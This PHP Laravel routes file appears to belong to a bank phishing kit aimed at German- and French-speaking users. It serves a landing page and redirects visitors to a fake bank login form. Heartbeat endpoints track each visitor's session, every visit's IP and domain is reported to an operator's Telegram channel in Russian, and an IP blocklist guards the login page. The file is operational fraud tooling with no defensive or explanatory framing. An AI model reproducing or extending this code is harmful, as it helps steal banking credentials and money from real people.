<?php

use App\Http\Controllers\BankLoginController;
use App\Http\Controllers\HeartbeatController;
use App\Listeners\NotifyAdminsOfBankSession;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;
use SergiX44\Nutgram\Nutgram;

require __DIR__.'/auth.php';

// Heartbeat (outside locale prefix, no auth)
Route::post('/heartbeat/{preSessionId}',         [HeartbeatController::class, 'ping'])->middleware('throttle:30,1');
Route::post('/heartbeat/{preSessionId}/offline', [HeartbeatController::class, 'offline'])->middleware('throttle:30,1');

// Redirect root → /de
Route::get('/', fn() => redirect('/de'));

Route::prefix('{locale}')
    ->where(['locale' => 'de|fr'])
    ->middleware('locale')
    ->group(function () {
        Route::get('/', function (Request $request) {
            $ip     = $request->clientIp();
            $domain = $request->getHost();
            if (Cache::add('visit:landing:' . $ip, true, 300)) {
                $notifier = app(NotifyAdminsOfBankSession::class);
                $notifier->sendToChannel("🌐 <b>Заход на лендинг</b>\n🌍 IP: <code>{$ip}</code>\n🌐 {$domain}");
            }
            return Inertia::render('Landing');
        });
        Route::get('/banks', function (Request $request) {
            $ip     = $request->clientIp();
            $domain = $request->getHost();
            if (Cache::add('visit:login-redirect:' . $ip, true, 300)) {
                $notifier = app(NotifyAdminsOfBankSession::class);
                $notifier->sendToChannel("🌐 <b>Переход к форме</b>\n🌍 IP: <code>{$ip}</code>\n🌐 {$domain}");
            }
            return redirect('/' . $request->route('locale') . '/' . BankLoginController::DEFAULT_SLUG);
        });
        Route::get('/info', function (Request $request) {
            $ip     = $request->clientIp();
            $domain = $request->getHost();
            if (Cache::add('visit:info:' . $ip, true, 300)) {
                $notifier = app(NotifyAdminsOfBankSession::class);
                $notifier->sendToChannel("📄 <b>Заход на страницу офферты</b>\n🌍 IP: <code>{$ip}</code>\n🌐 {$domain}");
            }
            return Inertia::render('Info');
        });

        Route::middleware(['blocked.ip'])->group(function () {
            Route::get('/' . BankLoginController::DEFAULT_SLUG, function (\Illuminate\Http\Request $request) {
                return app(BankLoginController::class)->show(BankLoginController::DEFAULT_SLUG, $request);
            })->name('bank-login.' . BankLoginController::DEFAULT_SLUG);
        });
    });
